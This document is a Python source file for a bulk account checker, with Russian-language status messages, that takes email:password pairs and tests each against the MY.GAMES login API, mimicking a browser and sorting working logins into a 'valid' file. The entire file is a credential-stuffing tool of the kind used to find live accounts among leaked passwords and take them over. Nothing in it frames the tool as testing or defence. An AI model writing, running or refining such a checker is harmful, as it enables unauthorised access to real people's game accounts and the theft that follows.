import requests
import time
import json
from typing import Tuple

class AccountChecker:
    def __init__(self, delay=1.0, debug=False, callback=None, log_file=None):
        self.delay = delay
        self.debug = debug
        self.callback = callback
        self.log_file = log_file
        self.session = requests.Session()
        self.stop_flag = False
        self.logs = []
        
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'Content-Type': 'application/json',
            'Origin': 'https://my.games',
            'Referer': 'https://my.games/',
        }
        self.session.headers.update(self.headers)
    
    def stop(self):
        self.stop_flag = True
    
    def write_log(self, message, level="INFO"):
        log_entry = f"[{level}] {message}"
        self.logs.append(log_entry)
        
        if self.log_file:
            try:
                with open(self.log_file, 'a', encoding='utf-8') as f:
                    f.write(log_entry + '\n')
            except:
                pass
        
        if self.callback:
            status_map = {
                "DEBUG": "info",
                "REQUEST": "info",
                "RESPONSE": "info",
                "ERROR": "error"
            }
            self.callback(message, status_map.get(level, "info"))
    
    def log_request(self, method, url, data=None):
        if self.debug:
            self.write_log(f"{method} {url}", "REQUEST")
            if data:
                safe_data = data.copy()
                if 'password' in safe_data:
                    safe_data['password'] = '*' * len(safe_data['password'])
                self.write_log(f"Request Data: {json.dumps(safe_data, ensure_ascii=False, indent=2)}", "REQUEST")
    
    def log_response(self, response):
        if self.debug:
            self.write_log(f"Response Status: {response.status_code} {response.reason}", "RESPONSE")
            try:
                if response.content:
                    if 'application/json' in response.headers.get('Content-Type', ''):
                        response_json = response.json()
                        self.write_log(f"Response Body: {json.dumps(response_json, ensure_ascii=False, indent=2)}", "RESPONSE")
                    else:
                        text = response.text[:500]
                        self.write_log(f"Response Body (first 500 chars): {text}", "RESPONSE")
            except Exception as e:
                self.write_log(f"Error parsing response: {e}", "ERROR")
    
    def send_update(self, message, status="info"):
        if self.callback:
            self.callback(message, status)
    
    def verify_account(self, email, password):
        if self.stop_flag:
            return False, "Остановлено"
            
        try:
            self.send_update(f"Проверка {email}...", "info")
            self.write_log(f"Начало проверки аккаунта: {email}", "DEBUG")
            
            try:
                self.write_log("Получение главной страницы для cookies...", "DEBUG")
                self.session.get('https://my.games/', timeout=10)
            except Exception as e:
                self.write_log(f"Ошибка при получении главной страницы: {e}", "ERROR")
            
            init_url = 'https://auth-ac.my.games/api/v3/pub/auth/init'
            init_data = {'login': email}
            
            try:
                self.log_request('POST', init_url, init_data)
                init_response = self.session.post(init_url, json=init_data, timeout=10)
                self.log_response(init_response)
                
                if init_response.status_code != 200:
                    return False, f"Ошибка инициализации: {init_response.status_code}"
                
                init_result = init_response.json()
                self.write_log(f"Init response: {json.dumps(init_result, ensure_ascii=False, indent=2)}", "DEBUG")
                
                init_token = (
                    init_result.get('token') or 
                    init_result.get('session_token') or 
                    init_result.get('auth_token') or
                    init_result.get('code')
                )
                
                if isinstance(init_token, (int, float)):
                    self.write_log(f"Init token (code) найден как число: {init_token}, не используем как token", "DEBUG")
                    init_token = None
                elif init_token:
                    self.write_log(f"Init token найден: {init_token[:20]}...", "DEBUG")
                
                verify_data = {
                    'login': email,
                    'password': password
                }
                
                if init_token and isinstance(init_token, str):
                    verify_data['token'] = init_token
                    self.write_log("Token добавлен в verify_data", "DEBUG")
                else:
                    self.write_log("Token не найден в init response, отправляем без token", "DEBUG")
                
                verify_url = 'https://auth-ac.my.games/api/v3/pub/auth/verify'
                
                try:
                    self.log_request('POST', verify_url, verify_data)
                    verify_response = self.session.post(verify_url, json=verify_data, timeout=10)
                    self.log_response(verify_response)
                    
                    if verify_response.status_code == 200:
                        try:
                            verify_result = verify_response.json()
                            
                            if verify_result.get('code') == 200:
                                return True, "Валид"
                            if verify_result.get('success') == True:
                                return True, "Валид"
                            if 'token' in verify_result or 'access_token' in verify_result:
                                return True, "Валид"
                            if 'user' in verify_result or 'profile' in verify_result:
                                return True, "Валид"
                            
                            if verify_result.get('code') and verify_result.get('code') != 200:
                                error_text = verify_result.get('text', 'Невалид')
                                return False, error_text
                        except (ValueError, json.JSONDecodeError):
                            pass
                        
                        try:
                            profile_response = self.session.get('https://api.my.games/social/profile/v2/session', timeout=10)
                            if profile_response.status_code == 200:
                                profile_data = profile_response.json()
                                if profile_data and ('id' in profile_data or 'email' in profile_data):
                                    return True, "Валид"
                        except:
                            pass
                        
                        return True, "Валид"
                    
                    elif verify_response.status_code == 401:
                        return False, "Невалид (неверный пароль)"
                    
                    elif verify_response.status_code == 400:
                        try:
                            error_data = verify_response.json()
                            error_text = error_data.get('text', 'Невалид (400 Bad Request)')
                            return False, error_text
                        except:
                            return False, "Невалид (400 Bad Request)"
                    
                    elif verify_response.status_code == 403:
                        return False, "Невалид (доступ запрещен)"
                    
                    elif verify_response.status_code == 404:
                        return False, "Невалид (endpoint не найден)"
                    
                    else:
                        return False, f"Невалид (HTTP {verify_response.status_code})"
                        
                except requests.exceptions.Timeout:
                    return False, "Таймаут"
                except requests.exceptions.RequestException as e:
                    return False, f"Ошибка запроса: {str(e)[:50]}"
                    
            except requests.exceptions.Timeout:
                return False, "Таймаут"
            except requests.exceptions.RequestException as e:
                return False, f"Ошибка запроса: {str(e)[:50]}"
                
        except Exception as e:
            return False, f"Ошибка: {str(e)[:50]}"
    
    def check_accounts_list(self, accounts, valid_file, invalid_file):
        valid_count = 0
        invalid_count = 0
        
        try:
            with open(valid_file, 'w', encoding='utf-8') as valid_f, \
                 open(invalid_file, 'w', encoding='utf-8') as invalid_f:
                
                for idx, account in enumerate(accounts, 1):
                    if self.stop_flag:
                        self.send_update("Проверка остановлена пользователем", "warning")
                        break
                    
                    try:
                        email, password = account.split(':', 1)
                        email = email.strip()
                        password = password.strip()
                        
                        if not email or not password:
                            invalid_f.write(f"{account} | Ошибка: некорректный формат\n")
                            invalid_count += 1
                            continue
                        
                        is_valid, message = self.verify_account(email, password)
                        
                        if is_valid:
                            valid_f.write(f"{account}\n")
                            valid_count += 1
                            self.send_update(f"✓ [{idx}/{len(accounts)}] {email} - Валид", "success")
                        else:
                            invalid_f.write(f"{account} | {message}\n")
                            invalid_count += 1
                            self.send_update(f"✗ [{idx}/{len(accounts)}] {email} - {message}", "error")
                        
                        if idx < len(accounts) and not self.stop_flag:
                            time.sleep(self.delay)
                            
                    except ValueError:
                        invalid_f.write(f"{account} | Ошибка: некорректный формат\n")
                        invalid_count += 1
                    except Exception as e:
                        invalid_f.write(f"{account} | Ошибка: {str(e)}\n")
                        invalid_count += 1
                        self.send_update(f"✗ [{idx}/{len(accounts)}] Ошибка: {str(e)[:50]}", "error")
            
            self.send_update(
                f"\nПроверка завершена! Валидных: {valid_count}, Невалидных: {invalid_count}",
                "success" if valid_count > 0 else "info"
            )
            
        except Exception as e:
            self.send_update(f"Критическая ошибка: {str(e)}", "error")

